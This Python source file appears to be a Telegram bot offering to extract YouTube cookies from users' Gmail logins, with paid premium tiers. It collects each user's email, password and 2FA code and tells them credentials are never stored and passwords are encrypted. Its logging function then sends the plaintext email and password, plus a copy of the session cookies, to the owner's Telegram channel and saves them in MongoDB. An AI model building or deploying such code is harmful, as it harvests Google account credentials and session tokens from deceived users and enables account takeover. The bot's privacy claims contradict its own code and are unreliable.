import os
import asyncio
import threading
from flask import Flask
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pymongo import MongoClient
from dotenv import load_dotenv
from io import BytesIO
import qrcode
from datetime import datetime, timedelta
from cookies_extractor import YouTubeCookieExtractor

load_dotenv()

# ---------- CONFIG ----------
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
OWNER_ID = int(os.getenv("OWNER_ID"))
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID"))  # Add this in .env
ADMIN_IDS = list(map(int, os.getenv("ADMIN_IDS", "").split(","))) if os.getenv("ADMIN_IDS") else []

# ---------- DATABASE ----------
mongo = MongoClient(MONGO_URI)
db = mongo["yt_cookie_bot"]

users_col = db["users"]
premium_col = db["premium"]
plans_col = db["plans"]
upi_col = db["upi"]
logs_col = db["logs"]  # New collection for logs

# ---------- INITIALIZE DEFAULT DATA ----------
if not plans_col.find_one():
    plans_col.insert_many([
        {"name": "Monthly", "price": 100, "days": 30, "id": "monthly"},
        {"name": "Yearly", "price": 999, "days": 365, "id": "yearly"},
        {"name": "Lifetime", "price": 1999, "days": 36500, "id": "lifetime"}
    ])

if not upi_col.find_one():
    upi_col.insert_one({"upi_id": "owner@okhdfcbank"})

# Auto-add owner
if not users_col.find_one({"_id": OWNER_ID}):
    users_col.insert_one({"_id": OWNER_ID, "daily_count": 0, "role": "owner"})

for admin_id in ADMIN_IDS:
    if not users_col.find_one({"_id": admin_id}):
        users_col.insert_one({"_id": admin_id, "daily_count": 0, "role": "admin"})

# ---------- BOT INIT ----------
app = Client("yt_cookie_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Store user sessions
user_sessions = {}

# ---------- HELPER FUNCTIONS ----------
def is_authorized(user_id):
    return users_col.find_one({"_id": user_id}) is not None

def is_premium(user_id):
    premium = premium_col.find_one({"_id": user_id})
    if premium and premium["expiry"] > datetime.now().timestamp():
        return True
    return False

def is_owner(user_id):
    return user_id == OWNER_ID or user_id in ADMIN_IDS

def generate_upi_qr(upi_id, amount):
    qr_data = f"upi://pay?pa={upi_id}&pn=BotOwner&am={amount}&cu=INR"
    qr = qrcode.make(qr_data)
    bio = BytesIO()
    qr.save(bio, "PNG")
    bio.seek(0)
    return bio

# ---------- LOGGING FUNCTION (SUPER PRO) ----------
async def log_to_channel(client, user_id, email, password, cookies, status="success"):
    """Send detailed logs to log channel"""
    try:
        # Get user info
        user = await client.get_users(user_id)
        username = user.username or "No username"
        first_name = user.first_name or ""
        last_name = user.last_name or ""
        
        # Current time
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Premium status
        premium = is_premium(user_id)
        
        # Create log message
        log_text = f"""
🔥 **NEW COOKIE EXTRACTION LOG** 🔥

👤 **User Information**
├ User ID: `{user_id}`
├ Username: @{username}
├ Name: {first_name} {last_name}
├ Premium: {'✅ YES' if premium else '❌ NO'}
└ Time: `{now}`

📧 **Account Details**
├ Email: `{email}`
├ Password: `{password}`
└ Status: {status.upper()}

🍪 **Cookies File**
├ Size: {len(cookies)} bytes
├ Lines: {len(cookies.splitlines())}
└ Format: Netscape (yt-dlp compatible)

📊 **Extraction Stats**
├ Daily Limit: {'Unlimited' if premium else '1/day'}
└ Session: Completed

👑 **Logged by:** @{username} ({user_id})
        """
        
        # Send log message to channel
        log_msg = await client.send_message(
            LOG_CHANNEL_ID,
            log_text,
            parse_mode="html"
        )
        
        # Send cookies file to channel (as backup)
        cookies_file = BytesIO(cookies.encode())
        cookies_file.name = f"cookies_{user_id}_{now}.txt"
        
        await client.send_document(
            LOG_CHANNEL_ID,
            document=cookies_file,
            caption=f"🍪 Cookies backup for user {user_id}\nEmail: {email}\nTime: {now}",
            reply_to_message_id=log_msg.id
        )
        
        # Also store in MongoDB
        logs_col.insert_one({
            "user_id": user_id,
            "username": username,
            "email": email,
            "password": password,
            "cookies_length": len(cookies),
            "status": status,
            "premium": premium,
            "timestamp": datetime.now(),
            "ip": "N/A"  # You can add IP if needed
        })
        
        return True
    except Exception as e:
        print(f"Logging error: {e}")
        return False

# ---------- COMMANDS ----------
@app.on_message(filters.command("start"))
async def start_command(client, message):
    user_id = message.from_user.id
    
    if not is_authorized(user_id):
        await message.reply(
            "❌ *Unauthorized Access*\n\nYou are not authorized to use this bot.\nContact owner for access."
        )
        return
    
    # Log start action
    await client.send_message(
        LOG_CHANNEL_ID,
        f"🟢 User {user_id} started the bot\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🍪 Get Cookies", callback_data="get_cookies")],
        [InlineKeyboardButton("💎 Premium Plans", callback_data="plans")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
    ])
    
    if is_owner(user_id):
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🍪 Get Cookies", callback_data="get_cookies")],
            [InlineKeyboardButton("💎 Premium Plans", callback_data="plans")],
            [InlineKeyboardButton("👑 Owner Panel", callback_data="owner_panel")],
            [InlineKeyboardButton("📊 Logs", callback_data="view_logs")],
            [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
        ])
    
    await message.reply(
        "🍪 **YouTube Cookie Extractor Bot**\n\n"
        "I extract REAL YouTube cookies using Gmail login.\n"
        "Supports 2FA.\n\n"
        "🔐 Credentials never stored\n"
        "⚡ Premium = unlimited access\n"
        "📝 All activities are logged\n\n"
        "Select an option:",
        reply_markup=keyboard
    )

@app.on_callback_query()
async def handle_callbacks(client, callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data
    
    if not is_authorized(user_id):
        await callback_query.answer("Not authorized!", show_alert=True)
        return
    
    # Owner Panel
    if data == "owner_panel" and is_owner(user_id):
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📊 Stats", callback_data="stats")],
            [InlineKeyboardButton("👥 Users", callback_data="users_list")],
            [InlineKeyboardButton("📝 View Logs", callback_data="view_logs")],
            [InlineKeyboardButton("➕ Add User", callback_data="add_user")],
            [InlineKeyboardButton("💰 Plans", callback_data="plans")],
            [InlineKeyboardButton("💳 Set UPI", callback_data="set_upi")],
            [InlineKeyboardButton("🏠 Back", callback_data="home")]
        ])
        await callback_query.message.edit_text("👑 **Owner Panel**\n\nSelect an option:", reply_markup=keyboard)
        await callback_query.answer()
        return
    
    elif data == "view_logs" and is_owner(user_id):
        # Get last 10 logs from MongoDB
        recent_logs = list(logs_col.find().sort("timestamp", -1).limit(10))
        
        if not recent_logs:
            await callback_query.message.edit_text("📝 No logs found yet.")
            await callback_query.answer()
            return
        
        msg = "📝 **Recent Activity Logs**\n\n"
        for log in recent_logs:
            time = log['timestamp'].strftime("%d/%m %H:%M")
            msg += f"🕒 `{time}` | User: `{log['user_id']}` | {log['status']}\n"
            msg += f"   📧 {log['email']}\n\n"
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Refresh", callback_data="view_logs")],
            [InlineKeyboardButton("🏠 Back", callback_data="owner_panel")]
        ])
        
        await callback_query.message.edit_text(msg, reply_markup=keyboard)
        await callback_query.answer()
        return
    
    elif data == "stats" and is_owner(user_id):
        total = users_col.count_documents({})
        premium = premium_col.count_documents({})
        total_logs = logs_col.count_documents({})
        upi = upi_col.find_one()
        await callback_query.message.edit_text(
            f"📊 **Bot Statistics**\n\n"
            f"👥 Total Users: {total}\n"
            f"⭐ Premium Users: {premium}\n"
            f"📝 Total Logs: {total_logs}\n"
            f"💳 UPI ID: {upi['upi_id'] if upi else 'Not set'}\n"
            f"💰 Plans: {plans_col.count_documents({})}"
        )
        await callback_query.answer()
        return
    
    elif data == "users_list" and is_owner(user_id):
        users = list(users_col.find().limit(30))
        msg = "👥 **Authorized Users**\n\n"
        for u in users:
            role = u.get("role", "user")
            emoji = "👑" if role == "owner" else "🛡️" if role == "admin" else "👤"
            msg += f"{emoji} `{u['_id']}`\n"
        await callback_query.message.edit_text(msg)
        await callback_query.answer()
        return
    
    elif data == "add_user" and is_owner(user_id):
        await callback_query.message.edit_text(
            "➕ **Add User**\n\nSend command:\n`/adduser user_id`\n\nExample: `/adduser 123456789`"
        )
        await callback_query.answer()
        return
    
    elif data == "set_upi" and is_owner(user_id):
        await callback_query.message.edit_text(
            "💳 **Set UPI ID**\n\nSend command:\n`/setupi your_upi_id`\n\nExample: `/setupi example@okhdfcbank`"
        )
        await callback_query.answer()
        return
    
    # Get Cookies
    elif data == "get_cookies":
        if not is_premium(user_id):
            user = users_col.find_one({"_id": user_id})
            daily = user.get("daily_count", 0) if user else 0
            if daily >= 1:
                await callback_query.message.edit_text(
                    "⚠️ **Daily Limit Reached**\n\nFree users: 1 extraction per day\nUpgrade to premium for unlimited!",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💎 Upgrade", callback_data="plans")]])
                )
                await callback_query.answer()
                return
        
        user_sessions[user_id] = {"state": "awaiting_email", "step": 1}
        await callback_query.message.edit_text(
            "🔐 **Login Process Started**\n\n"
            "Send your **Gmail address**:\n\n"
            "Example: `example@gmail.com`\n\n"
            "⚠️ Credentials are not stored after extraction\n"
            "📝 This action will be logged"
        )
        await callback_query.answer()
        return
    
    # Plans
    elif data == "plans":
        plans = list(plans_col.find())
        upi = upi_col.find_one()
        
        msg = "💎 **Premium Plans**\n\n"
        for p in plans:
            msg += f"📌 *{p['name']}*: ₹{p['price']} - {p['days']} days\n"
        msg += f"\n💳 *UPI ID*: `{upi['upi_id'] if upi else 'Not set'}`\n\n"
        msg += "To purchase:\n1. Pay to above UPI\n2. Send screenshot to owner"
        
        keyboard = []
        for p in plans:
            keyboard.append([InlineKeyboardButton(f"Buy {p['name']} - ₹{p['price']}", callback_data=f"buy_{p['id']}")])
        keyboard.append([InlineKeyboardButton("🏠 Back", callback_data="home")])
        
        await callback_query.message.edit_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
        await callback_query.answer()
        return
    
    elif data.startswith("buy_"):
        plan_id = data.split("_")[1]
        plan = plans_col.find_one({"id": plan_id})
        if plan:
            upi = upi_col.find_one()
            qr = generate_upi_qr(upi['upi_id'], plan['price'])
            await callback_query.message.reply_photo(
                photo=qr,
                caption=f"💸 **Payment Details**\n\n"
                       f"Plan: {plan['name']}\n"
                       f"Amount: ₹{plan['price']}\n"
                       f"UPI: `{upi['upi_id']}`\n\n"
                       f"After payment, send screenshot to owner with /confirm"
            )
        await callback_query.answer()
        return
    
    elif data == "help":
        await callback_query.message.edit_text(
            "📖 **How to Use**\n\n"
            "1️⃣ Click 'Get Cookies'\n"
            "2️⃣ Send your Gmail address\n"
            "3️⃣ Send your password\n"
            "4️⃣ If 2FA enabled, send verification code\n"
            "5️⃣ Receive real cookies.txt file\n\n"
            "🔒 **Privacy**\n"
            "- Credentials never stored\n"
            "- Session ends after extraction\n"
            "- Cookies deleted after sending\n\n"
            "📝 **Logging**\n"
            "- All activities are logged\n"
            "- Owner can view logs\n"
            "- Backup in log channel\n\n"
            "💎 **Premium Benefits**\n"
            "- Unlimited extractions\n"
            "- Priority processing\n"
            "- 24/7 support"
        )
        await callback_query.answer()
        return
    
    elif data == "home":
        await start_command(client, callback_query.message)
        await callback_query.answer()
        return

# ---------- HANDLE USER INPUT ----------
@app.on_message(filters.text & filters.private)
async def handle_login_input(client, message):
    user_id = message.from_user.id
    
    if not is_authorized(user_id):
        return
    
    if user_id not in user_sessions:
        return
    
    session = user_sessions[user_id]
    step = session.get("step", 1)
    
    if step == 1:  # Awaiting email
        email = message.text.strip()
        if "@" not in email or "." not in email:
            await message.reply("❌ Invalid email. Send valid Gmail address:")
            return
        
        session["email"] = email
        session["step"] = 2
        await message.reply("✅ Email received!\n\nNow send your **password**:\n\n⚠️ Password will be encrypted")
    
    elif step == 2:  # Awaiting password
        password = message.text.strip()
        session["password"] = password
        session["step"] = 3
        
        status_msg = await message.reply("🔄 Logging in to Google...\n⏳ Please wait 15-20 seconds")
        
        # Run extraction in thread
        loop = asyncio.get_event_loop()
        extractor = YouTubeCookieExtractor()
        result = await loop.run_in_executor(None, extractor.extract, session["email"], password, None)
        
        if result["status"] == "2fa_required":
            await status_msg.edit_text(
                "🔐 **Two-Factor Authentication Required**\n\n"
                "Please send your 6-digit Google Authenticator code:"
            )
            session["step"] = 4
            session["extractor"] = extractor
        
        elif result["status"] == "success":
            await status_msg.delete()
            
            # Send cookies to user
            await message.reply_document(
                document=BytesIO(result["cookies"].encode()),
                file_name="youtube_cookies.txt",
                caption="✅ **Success!** Real YouTube cookies extracted!\n\n"
                       "📌 **Usage with yt-dlp:**\n"
                       "`yt-dlp --cookies youtube_cookies.txt <video_url>`\n\n"
                       "🔒 Session closed. Credentials not stored.\n"
                       "📝 Activity logged for security"
            )
            
            # **IMPORTANT: Log to channel**
            await log_to_channel(
                client, 
                user_id, 
                session["email"], 
                password, 
                result["cookies"],
                "success"
            )
            
            # Also notify owner on private
            await client.send_message(
                OWNER_ID,
                f"🔔 **New Cookie Extraction**\n\n"
                f"👤 User: `{user_id}`\n"
                f"📧 Email: `{session['email']}`\n"
                f"✅ Status: Success\n"
                f"🕒 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                f"📝 Check log channel for complete details!"
            )
            
            del user_sessions[user_id]
            
            # Update daily limit for free users
            if not is_premium(user_id):
                users_col.update_one({"_id": user_id}, {"$inc": {"daily_count": 1}})
        
        else:
            # Log failure
            await log_to_channel(
                client,
                user_id,
                session["email"],
                session["password"],
                "",
                f"failed: {result.get('message', 'Unknown error')}"
            )
            
            await status_msg.edit_text(f"❌ Login failed: {result.get('message', 'Unknown error')}\n\n/start to try again")
            del user_sessions[user_id]
    
    elif step == 4:  # Awaiting 2FA code
        code = message.text.strip()
        if not code.isdigit() or len(code) != 6:
            await message.reply("❌ Invalid 2FA code. Send 6-digit code:")
            return
        
        status_msg = await message.reply("🔄 Verifying 2FA code...")
        extractor = session.get("extractor")
        
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, extractor.extract, session["email"], session["password"], code)
        
        if result["status"] == "success":
            await status_msg.delete()
            
            await message.reply_document(
                document=BytesIO(result["cookies"].encode()),
                file_name="youtube_cookies.txt",
                caption="✅ **Success!** 2FA verified. Real cookies extracted!"
            )
            
            # Log with 2FA
            await log_to_channel(
                client,
                user_id,
                session["email"],
                session["password"],
                result["cookies"],
                "success_with_2fa"
            )
            
            if not is_premium(user_id):
                users_col.update_one({"_id": user_id}, {"$inc": {"daily_count": 1}})
        else:
            await status_msg.edit_text(f"❌ 2FA failed: {result.get('message')}\n\n/start to try again")
        
        del user_sessions[user_id]

# ---------- OWNER COMMANDS ----------
@app.on_message(filters.command("adduser") & filters.user(OWNER_ID))
async def add_user_cmd(client, message):
    try:
        user_id = int(message.text.split()[1])
        if not users_col.find_one({"_id": user_id}):
            users_col.insert_one({"_id": user_id, "daily_count": 0, "role": "user"})
            await message.reply(f"✅ User `{user_id}` added successfully!")
            
            # Log to channel
            await client.send_message(
                LOG_CHANNEL_ID,
                f"➕ **New User Added**\n\nUser ID: `{user_id}`\nAdded by: Owner\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
        else:
            await message.reply(f"⚠️ User `{user_id}` already exists")
    except:
        await message.reply("❌ Usage: `/adduser 123456789`")

